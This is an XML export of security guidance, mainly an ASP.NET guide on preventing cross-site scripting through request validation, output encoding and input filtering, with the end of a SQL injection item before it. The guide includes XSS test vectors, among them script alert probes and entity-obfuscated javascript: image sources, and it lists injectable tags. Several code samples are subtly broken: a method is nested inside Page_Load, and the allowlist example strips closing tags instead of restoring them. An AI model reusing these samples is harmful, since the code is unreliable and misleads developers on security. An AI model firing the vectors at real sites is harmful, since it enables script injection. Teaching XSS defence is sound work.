http://en.wikipedia.org/wiki/Percent-encoding&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href="http://www.securitydocs.com/pdf/2656.PDF"&gt;SQL Injection:&amp;nbsp; Are your Web Applications Vulnerable? Kevin Spett.&amp;nbsp; Spi Dynamics.&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.appsecinc.com/presentations/Manipulating_SQL_Server_Using_SQL_Injection.pdf"&gt;Manipulating Microsoft SQL Server Using SQL&amp;nbsp; Injection. Cesar Cerrudo. Application Security, Inc.&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.ngssoftware.com/papers/sqlinference.pdf"&gt;Data-mining with SQL Injection and Inference. &amp;nbsp;David Litchfield.&amp;nbsp; NGS Software.&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>7729f9db-bfae-4606-acab-4b80ec099a2f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Prevent Cross-Site Scripting in ASP.NET</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;This How to shows how you can help protect your ASP.NET applications from cross-site scripting attacks by using proper input validation techniques and by encoding the output. It also describes a number of other protection mechanisms that you can use in addition
 to these two main countermeasures.&lt;/p&gt;
&lt;p&gt;Cross-site scripting (XSS) attacks exploit vulnerabilities in Web page validation by injecting client-side script code. Common vulnerabilities that make your Web applications susceptible to cross-site scripting attacks include failing to properly validate
 input, failing to encode output, and trusting the data retrieved from a shared database. To protect your application against cross-site scripting attacks, assume that all input is malicious. Constrain and validate all input. Encode all output that could, potentially,
 include HTML characters. This includes data read from files and databases.&lt;/p&gt;
&lt;h1&gt;Contents&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Objectives&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Overview&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Summary of Steps&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 1. Check That ASP.NET Request Validation Is Enabled&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 2. Review ASP.NET Code That Generates HTML Output&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 3. Determine Whether HTML Output Includes Input Parameters&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 4. Review Potentially Dangerous HTML Tags and Attributes&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 5. Evaluate Countermeasures&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Considerations&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Resources&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Understand the common cross-site scripting vulnerabilities in Web page validation.
&lt;/li&gt;&lt;li&gt;Apply countermeasures for cross-site scripting attacks. &lt;/li&gt;&lt;li&gt;Constrain input by using regular expressions, type checks, and ASP.NET validator controls.
&lt;/li&gt;&lt;li&gt;Constrain output to ensure the browser does not execute HTML tags that contain script code.
&lt;/li&gt;&lt;li&gt;Review potentially dangerous HTML tags and attributes and evaluate countermeasures.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Overview&lt;/h1&gt;
&lt;p&gt;Cross-site scripting attacks exploit vulnerabilities in Web page validation by injecting client-side script code. The script code embeds itself in response data, which is sent back to an unsuspecting user. The user's browser then runs the script code. Because
 the browser downloads the script code from a trusted site, the browser has no way of recognizing that the code is not legitimate, and Microsoft Internet Explorer security zones provide no defense. Cross-site scripting attacks also work over HTTP and HTTPS
 (SSL) connections. &lt;/p&gt;
&lt;p&gt;One of the most serious examples of a cross-site scripting attack occurs when an attacker writes script to retrieve the authentication cookie that provides access to a trusted site and then posts the cookie to a Web address known to the attacker. This enables
 the attacker to spoof the legitimate user's identity and gain illicit access to the Web site.&lt;/p&gt;
&lt;p&gt;Common vulnerabilities that make your Web application susceptible to cross-site scripting attacks include:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Failing to constrain and validate input. &lt;/li&gt;&lt;li&gt;Failing to encode output. &lt;/li&gt;&lt;li&gt;Trusting data retrieved from a shared database. &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Guidelines&lt;/h2&gt;
&lt;p&gt;The two most important countermeasures to prevent cross-site scripting attacks are to:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Constrain input&lt;/strong&gt;.&lt;strong&gt; &lt;/strong&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Encode output&lt;/strong&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Constrain Input&lt;/h3&gt;
&lt;p&gt;Start by assuming that all input is malicious. Validate input type, length, format, and range.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;To constrain input supplied through server controls, use ASP.NET validator controls such as
&lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; and &lt;strong&gt;RangeValidator&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;To constrain input supplied through client-side HTML input controls or input from other sources such as query strings or cookies, use the
&lt;strong&gt;System.Text.RegularExpressions.Regex&lt;/strong&gt; class in your server-side code to check for expected using regular expressions.
&lt;/li&gt;&lt;li&gt;To validate types such as integers, doubles, dates, and currency amounts, convert the input data to the equivalent .NET Framework data type and handle any resulting conversion errors.
&lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Encode Output&lt;/h3&gt;
&lt;p&gt;Use the &lt;strong&gt;AntiXSSLibrary.HtmlEncode&lt;/strong&gt; method to encode output if it contains input from the user or from other sources such as databases.
&lt;strong&gt;HtmlEncode&lt;/strong&gt; replaces characters that have special meaning in HTML-to-HTML variables that represent those characters. For example, &amp;lt; is replaced with
&lt;strong&gt;&amp;amp;lt;&lt;/strong&gt; and &lt;strong&gt;&amp;quot;&lt;/strong&gt; is replaced with &lt;strong&gt;&amp;amp;quot;&lt;/strong&gt;. Encoded data does not cause the browser to execute code. Instead, the data is rendered as harmless HTML.&lt;/p&gt;
&lt;p&gt;Similarly, use &lt;strong&gt;AntiXSSLibrary.UrlEncode&lt;/strong&gt; to encode output URLs if they are constructed from input.&lt;/p&gt;
&lt;h1&gt;Summary of Steps&lt;/h1&gt;
&lt;p&gt;To prevent cross-site scripting, perform the following steps: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1. Check that ASP.NET request validation is enabled. &lt;/li&gt;&lt;li&gt;Step 2. Review ASP.NET code that generates HTML output. &lt;/li&gt;&lt;li&gt;Step 3. Determine whether HTML output includes input parameters. &lt;/li&gt;&lt;li&gt;Step 4. Review potentially dangerous HTML tags and attributes. &lt;/li&gt;&lt;li&gt;Step 5. Evaluate countermeasures. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 1. Check That ASP.NET Request Validation Is Enabled&lt;/h1&gt;
&lt;p&gt;By default, request validation is enabled in Machine.config. Verify that request validation is currently enabled in your server's Machine.config file and that your application does not override this setting in its Web.config file. Check that
&lt;strong&gt;validateRequest&lt;/strong&gt; is set to &lt;strong&gt;true &lt;/strong&gt;as shown in the following code example.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;pages buffer=&amp;quot;true&amp;quot; validateRequest=&amp;quot;true&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/system.web&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You can disable request validation on a page-by-page basis. Check that your pages do not disable this feature unless necessary. For example, you may need to disable this feature for a page if it contains a free-format, rich-text entry field designed to accept
 a range of HTML characters as input. &lt;/p&gt;
&lt;h2&gt;To test that ASP.NET request validation is enabled &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Create an ASP.NET page that disables request validation. To do this, set &lt;strong&gt;
ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt;, as shown in the following code example.
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; ValidateRequest=&amp;quot;false&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; void btnSubmit_Click(Object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // If ValidateRequest is false, then 'hello' is displayed&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // If ValidateRequest is true, then ASP.NET returns an exception&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(txtString.Text);&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;nbsp;&amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox id=&amp;quot;txtString&amp;quot; runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;&amp;lt;script&amp;gt;alert('hello');&amp;lt;/script&amp;gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button id=&amp;quot;btnSubmit&amp;quot; runat=&amp;quot;server&amp;quot;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnClick=&amp;quot;btnSubmit_Click&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;Submit&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the page. It displays &lt;strong&gt;Hello&lt;/strong&gt; in a message box because the script in
&lt;strong&gt;txtString&lt;/strong&gt; is passed through and rendered as client-side script in your browser.
&lt;/li&gt;&lt;li&gt;Set &lt;strong&gt;ValidateRequest=&amp;quot;true&amp;quot;&lt;/strong&gt; or remove the &lt;strong&gt;ValidateRequest&lt;/strong&gt; page attribute and browse to the page again. Verify that the following error message is displayed.
&lt;div&gt;
&lt;pre&gt;A potentially dangerous Request.Form value was detected from the client (txtString=&amp;quot;&amp;lt;script&amp;gt;alert('hello...&amp;quot;).  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This indicates that ASP.NET request validation is active and has rejected the input because it includes potentially dangerous HTML characters.
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Do not rely on ASP.NET request validation. Treat it as an extra precautionary measure in addition to your own input validation.&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;&lt;br&gt;
Step 2. Review ASP.NET Code That Generates HTML Output&lt;/h1&gt;
&lt;p&gt;ASP.NET writes HTML as output in two ways, as shown in the following code examples.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Response.Write&lt;br&gt;&amp;lt;% = &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Search your pages to locate where HTML and URL output is returned to the client.&lt;/p&gt;
&lt;h1&gt;Step 3. Determine Whether HTML Output Includes Input Parameters&lt;/h1&gt;
&lt;p&gt;Analyze your design and your page code to determine whether the output includes any input parameters. These parameters can come from a variety of sources. The following list includes common input sources:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Form fields&lt;/strong&gt;, such as the following.
&lt;div&gt;
&lt;pre&gt;Response.Write(name.Text);&lt;br&gt;Response.Write(Request.Form[&amp;quot;name&amp;quot;]);&lt;br&gt;Query Strings&lt;br&gt;Response.Write(Request.QueryString[&amp;quot;name&amp;quot;]);  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Query strings&lt;/strong&gt;, such as the following:
&lt;div&gt;
&lt;pre&gt;Response.Write(Request.QueryString[&amp;quot;username&amp;quot;]);  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Databases and data access methods&lt;/strong&gt;, such as the following:
&lt;div&gt;
&lt;pre&gt;SqlDataReader reader = cmd.ExecuteReader();&lt;br&gt;Response.Write(reader.GetString(1));  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Be particularly careful with data read from a database if it is shared by other applications.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Cookie collection&lt;/strong&gt;, such as the following:
&lt;div&gt;
&lt;pre&gt;Response.Write(&lt;br&gt;Request.Cookies[&amp;quot;name&amp;quot;].Values[&amp;quot;name&amp;quot;]);  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Session and application variables&lt;/strong&gt;, such as the following:
&lt;div&gt;
&lt;pre&gt;Response.Write(Session[&amp;quot;name&amp;quot;]);&lt;br&gt;Response.Write(Application[&amp;quot;name&amp;quot;]);  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;In addition to source code analysis, you can also perform a simple test by typing text such as &amp;quot;&lt;strong&gt;XYZ&lt;/strong&gt;&amp;quot; in form fields and testing the output. If the browser displays &amp;quot;&lt;strong&gt;XYZ&lt;/strong&gt;&amp;quot; or if you see &amp;quot;&lt;strong&gt;XYZ&lt;/strong&gt;&amp;quot; when you view
 the source of the HTML, your Web application is vulnerable to cross-site scripting.
&lt;/p&gt;
&lt;p&gt;To see something more dynamic, inject &amp;lt;&lt;strong&gt;script&lt;/strong&gt;&amp;gt;&lt;strong&gt;alert('hello');&lt;/strong&gt;&amp;lt;&lt;strong&gt;/script&lt;/strong&gt;&amp;gt; through an input field. This technique might not work in all cases because it depends on how the input is used to generate the output.&lt;/p&gt;
&lt;h1&gt;Step 4. Review Potentially Dangerous HTML Tags and Attributes&lt;/h1&gt;
&lt;p&gt;If you dynamically create HTML tags and construct tag attributes with potentially unsafe input, make sure you HTML-encode the tag attributes before writing them out.
&lt;/p&gt;
&lt;p&gt;The following .aspx page shows how you can write HTML directly to the return page by using the &amp;lt;&lt;strong&gt;asp:Literal&lt;/strong&gt;&amp;gt; control. The code takes user input of a color name, inserts it into the HTML sent back, and displays text in the color entered.
 The page uses &lt;strong&gt;HtmlEncode&lt;/strong&gt; to ensure the inserted text is safe.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; AutoEventWireup=&amp;quot;true&amp;quot;%&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Color:&amp;amp;nbsp;&amp;lt;asp:TextBox ID=&amp;quot;TextBox1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&amp;lt;/asp:TextBox&amp;gt;&amp;lt;br /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;Button1&amp;quot; runat=&amp;quot;server&amp;quot; Text=&amp;quot;Show color&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnClick=&amp;quot;Button1_Click&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Literal ID=&amp;quot;Literal1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&amp;lt;/asp:Literal&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; private void Page_Load(Object Src, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Button1_Click(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Literal1.Text = @&amp;quot;&amp;lt;span style=&amp;quot;&amp;quot;color:&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;#43; Server.HtmlEncode(TextBox1.Text)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;#43; @&amp;quot;&amp;quot;&amp;quot;&amp;gt;Color example&amp;lt;/span&amp;gt;&amp;quot;;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;lt;/Script&amp;gt;&lt;/pre&gt;
&lt;h2&gt;Potentially Dangerous HTML Tags&lt;/h2&gt;
&lt;p&gt;While not an exhaustive list, the following commonly used HTML tags could allow a malicious user to inject script code:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;&lt;strong&gt;applet&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;body&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;embed&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;frame&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;script&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;frameset&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;html&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;iframe&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;img&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;style&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;layer&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;link&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;ilayer&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;meta&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;object&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;An attacker can use HTML attributes such as &lt;strong&gt;src&lt;/strong&gt;, &lt;strong&gt;lowsrc&lt;/strong&gt;,
&lt;strong&gt;style&lt;/strong&gt;, and &lt;strong&gt;href&lt;/strong&gt; in conjunction with the preceding tags to inject cross-site scripting. For example, the
&lt;strong&gt;src&lt;/strong&gt; attribute of the &amp;lt;&lt;strong&gt;img&lt;/strong&gt;&amp;gt; tag can be a source of injection, as shown in the following examples.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;img src=&amp;quot;javascript:alert('hello');&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;img src=&amp;quot;java&amp;amp;#010;script:alert('hello');&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;img src=&amp;quot;java&amp;amp;#X0A;script:alert('hello');&amp;quot;&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;An attacker can also use the &amp;lt;&lt;strong&gt;style&lt;/strong&gt;&amp;gt; tag to inject a script by changing the MIME type as shown in the following.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;style TYPE=&amp;quot;text/javascript&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; alert('hello');&lt;br&gt;&amp;lt;/style&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h1&gt;Step 5. Evaluate Countermeasures&lt;/h1&gt;
&lt;p&gt;When you find ASP.NET code that generates HTML using some input, you need to evaluate appropriate countermeasures for your specific application. Countermeasures include:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Encode HTML output. &lt;/li&gt;&lt;li&gt;Encode URL output. &lt;/li&gt;&lt;li&gt;Filter user input. &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Encode HTML Output&lt;/h2&gt;
&lt;p&gt;If you write text output to a Web page and you do not know if the text contains HTML special characters (such as &amp;lt;, &amp;gt;, and
&lt;strong&gt;&amp;amp;&lt;/strong&gt;), pre-process the text by using the &lt;strong&gt;AntiXSSLibrary.HtmlEncode&lt;/strong&gt; method as shown in the following code example. Do this if the text came from user input, a database, or a local file.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Response.Write(AntiXSSLibrary.HtmlEncode(Request.Form[&amp;quot;name&amp;quot;]));  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Do not substitute encoding output for checking that input is well-formed and correct. Use it as an additional security precaution.&lt;/p&gt;
&lt;h2&gt;Encode URL Output&lt;/h2&gt;
&lt;p&gt;If you return URL strings that contain input to the client, use the &lt;strong&gt;AntiXSSLibrary.UrlEncode&lt;/strong&gt; method to encode these URL strings as shown in the following code example.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Response.Write(AntiXSSLibrary.UrlEncode(urlString));  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Filter User Input&lt;/h2&gt;
&lt;p&gt;If you have pages that need to accept a range of HTML elements, for example through some kind of rich text input field, you must disable ASP.NET request validation for the page. If you have several pages that do this, create a filter that allows only the
 HTML elements that you want to accept. A common practice is to restrict formatting to safe HTML elements such as bold (&amp;lt;&lt;strong&gt;b&lt;/strong&gt;&amp;gt;) and italic (&amp;lt;&lt;strong&gt;i&lt;/strong&gt;&amp;gt;).&lt;/p&gt;
&lt;h3&gt;To safely allow restricted HTML input &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Disable ASP.NET request validation by the adding the &lt;strong&gt;ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt; attribute to the
&lt;strong&gt;@ Page&lt;/strong&gt; directive. &lt;/li&gt;&lt;li&gt;Encode the string input with the &lt;strong&gt;HtmlEncode&lt;/strong&gt; method. &lt;/li&gt;&lt;li&gt;Use a &lt;strong&gt;StringBuilder&lt;/strong&gt; and call its &lt;strong&gt;Replace&lt;/strong&gt; method to selectively remove the encoding on the HTML elements that you want to permit.
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;The following .aspx page code shows this approach. The page disables ASP.NET request validation by setting
&lt;strong&gt;ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt;. It HTML-encodes the input and then selectively allows the &amp;lt;&lt;strong&gt;b&lt;/strong&gt;&amp;gt; and &amp;lt;&lt;strong&gt;i&lt;/strong&gt;&amp;gt; HTML elements to support simple text formatting.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; ValidateRequest=&amp;quot;false&amp;quot;%&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; void submitBtn_Click(object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Encode the string input&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; StringBuilder sb = new StringBuilder(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; AntiXSSLibrary.HtmlEncode(htmlInputTxt.Text));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Selectively allow&amp;nbsp; &amp;lt;b&amp;gt; and &amp;lt;i&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;b&amp;amp;gt;&amp;quot;, &amp;quot;&amp;lt;b&amp;gt;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;/b&amp;amp;gt;&amp;quot;, &amp;quot;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;i&amp;amp;gt;&amp;quot;, &amp;quot;&amp;lt;i&amp;gt;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;/i&amp;amp;gt;&amp;quot;, &amp;quot;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(sb.ToString());&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox ID=&amp;quot;htmlInputTxt&amp;quot; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; TextMode=&amp;quot;MultiLine&amp;quot; 